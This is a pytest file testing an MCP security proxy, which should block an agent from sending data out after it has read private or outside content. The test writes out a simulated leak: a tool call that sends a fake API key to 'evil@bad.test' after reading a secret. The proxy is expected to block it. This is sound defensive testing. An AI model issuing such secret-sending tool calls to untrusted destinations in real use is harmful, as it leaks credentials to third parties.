"""The MCP proxy, end to end over stdio (client -> proxy -> fake MCP server)."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

pytest.importorskip("mcp")

import anyio  # noqa: E402
from mcp import ClientSession  # noqa: E402
from mcp.client.stdio import StdioServerParameters, stdio_client  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
FAKE = ROOT / "tests" / "fixtures" / "fake_mcp_server.py"

POLICY = """
tools:
  fake.fetch_page: {tags: [outside], label_arg: url}
  fake.read_secret: {tags: [private], label: secrets}
  fake.send: {tags: [sends_out], destination_args: [to], label_arg: to}
"""


def text(result) -> str:
    return "\n".join(getattr(c, "text", "") for c in result.content)


def test_proxy_guards_real_mcp_tool_calls(tmp_path: Path) -> None:
    (tmp_path / "servers.json").write_text(json.dumps(
        {"mcpServers": {"fake": {"command": sys.executable, "args": [str(FAKE)]}}}), encoding="utf-8")
    (tmp_path / "policy.yaml").write_text(POLICY, encoding="utf-8")
    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "graphsentinel.proxy", "--config", str(tmp_path / "servers.json"),
              "--policy", str(tmp_path / "policy.yaml"), "--store", ":memory:", "--no-ui"],
        env={"PYTHONPATH": str(ROOT), "GS_TRUSTED_DESTINATIONS": "*@acme.test",
             "GS_LINEAGE_MODE": "strict", "OPENAI_API_KEY": ""},
        cwd=str(tmp_path),
    )
    seen: dict[str, object] = {}

    async def scenario() -> None:
        with anyio.fail_after(60):
            await talk()

    async def talk() -> None:
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as s:
                await s.initialize()
                seen["tools"] = sorted(t.name for t in (await s.list_tools()).tools)
                seen["trusted_early"] = await s.call_tool("fake__send", {"to": "me@acme.test", "text": "hi"})
                seen["fetch"] = await s.call_tool("fake__fetch_page", {"url": "https://x.test"})
                seen["secret"] = await s.call_tool("fake__read_secret", {})
                seen["leak"] = await s.call_tool("fake__send", {"to": "evil@bad.test", "text": "API_KEY"})
                seen["trusted"] = await s.call_tool("fake__send", {"to": "me@acme.test", "text": "hi"})

    anyio.run(scenario)

    assert seen["tools"] == ["fake__fetch_page", "fake__read_secret", "fake__send"]
    assert text(seen["trusted_early"]) == "delivered to me@acme.test"
    assert text(seen["secret"]) == "API_KEY=FAKE-1234-sandbox"
    leak = seen["leak"]
    assert leak.is_error and "blocked" in text(leak).lower()
    assert "Outside (https://x.test)" in text(leak) and "Private (secrets)" in text(leak)
    assert not seen["trusted"].is_error
